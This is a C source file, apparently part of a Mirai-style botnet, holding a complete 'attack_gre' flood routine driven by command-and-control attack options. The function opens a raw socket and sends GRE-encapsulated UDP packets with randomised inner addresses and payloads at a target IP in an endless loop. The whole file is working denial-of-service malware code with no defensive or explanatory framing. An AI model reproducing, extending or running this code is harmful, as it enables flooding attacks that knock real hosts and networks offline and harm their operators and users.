#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <sys/time.h>
#include <errno.h>
#include <stdint.h>

#include "headers/attacks.h"
#include "headers/utils.h"
#include "headers/cnc_protocol.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/protocol.h"


void attack_gre(char *ip, int port, int duration, struct attack_option *opts, uint8_t opts_len) {
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    int sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    int gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, 0);

    unsigned int seed = time(NULL) ^ getpid();

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int pkt_size = sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    char *pkt = malloc(pkt_size);
    if (!pkt) {
        close(sock);
        return;
    }

    struct iphdr *iph = (struct iphdr *)pkt;
    struct grehdr *greh = (struct grehdr *)(iph + 1);
    struct iphdr *greiph = (struct iphdr *)(greh + 1);
    struct udphdr *udph = (struct udphdr *)(greiph + 1);
    char *payload = (char *)(udph + 1);

    util_zero(pkt, pkt_size);

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = inet_addr(ip);
    dst.sin_port = 0;

    ipv4_t saddr = util_local_addr();
    if (saddr == 0) saddr = inet_addr("0.0.0.0");

    while (1) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = ip_tos;
        iph->tot_len = htons(pkt_size);
        iph->id = htons(rand_r(&seed));
        iph->frag_off = htons(1 << 14);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_GRE;
        iph->saddr = saddr;
        iph->daddr = dst.sin_addr.s_addr;
        iph->check = 0;
        iph->check = cks((unsigned short*)pkt, sizeof(struct iphdr));

        greh->opts = 0;
        greh->protocol = htons(ETH_P_IP);

        greiph->ihl = 5;
        greiph->version = 4;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
        greiph->id = htons(~ntohs(iph->id));
        greiph->ttl = ip_ttl;
        greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_r(&seed);
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = rand_r(&seed);
        greiph->check = 0;
        greiph->check = cks((unsigned short*)greiph, sizeof(struct iphdr));

        udph->source = (sport == 0xffff) ? htons(rand_r(&seed) % 65535 + 1) : htons(sport);
        udph->dest = (port == 0) ? htons(rand_r(&seed) % 65535 + 1) : htons(port);
        udph->len = htons(sizeof(struct udphdr) + payload_size);

        for (int i = 0; i < payload_size; i++) payload[i] = rand_r(&seed) & 0xff;

        udph->check = 0;
        struct {
            uint32_t saddr;
            uint32_t daddr;
            uint8_t zero;
            uint8_t protocol;
            uint16_t len;
        } phdr;
        phdr.saddr = greiph->saddr;
        phdr.daddr = greiph->daddr;
        phdr.zero = 0;
        phdr.protocol = IPPROTO_UDP;
        phdr.len = udph->len;

        int pseudo_pkt_size = sizeof(phdr) + sizeof(struct udphdr) + payload_size;
        char *pseudo_pkt = malloc(pseudo_pkt_size);
        if (pseudo_pkt) {
            util_memcpy(pseudo_pkt, &phdr, sizeof(phdr));
            util_memcpy(pseudo_pkt + sizeof(phdr), udph, sizeof(struct udphdr));
            util_memcpy(pseudo_pkt + sizeof(phdr) + sizeof(struct udphdr), payload, payload_size);
            udph->check = cks((unsigned short*)pseudo_pkt, pseudo_pkt_size);
            free(pseudo_pkt);
        }

        sendto(sock, pkt, pkt_size, 0, (struct sockaddr*)&dst, sizeof(dst));
    }

    free(pkt);
    close(sock);
}
